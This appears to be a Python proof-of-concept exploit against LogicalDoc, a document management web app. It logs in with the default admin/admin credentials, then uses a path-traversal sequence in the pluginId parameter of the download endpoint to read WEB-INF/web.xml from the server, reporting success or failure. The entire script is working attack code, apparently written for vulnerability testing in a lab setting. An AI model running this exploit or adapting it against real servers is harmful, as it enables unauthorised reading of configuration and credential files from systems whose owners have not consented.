import requests
from requests.auth import HTTPBasicAuth

sess = requests.Session()
url1 = 'http://web:8080/login.jsp'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36'
}
data = {
        "j_username": "admin", "j_password": "admin"
}

f = sess.post(url1, headers=headers, data=data)
url2 = 'http://web:8080/download?resourcePath=/opt/logicaldoc/tomcat/webapps/ROOT/WEB-INF/web.xml&pluginId=../../../../../../../'
sess = requests.Session()
r = sess.get(url2, headers=headers, auth = HTTPBasicAuth('admin','admin'))

print(r.status_code)
print(r.text)

if("web-app" in r.text):
    print('PoC success!')
else:
    print('PoC failed!')





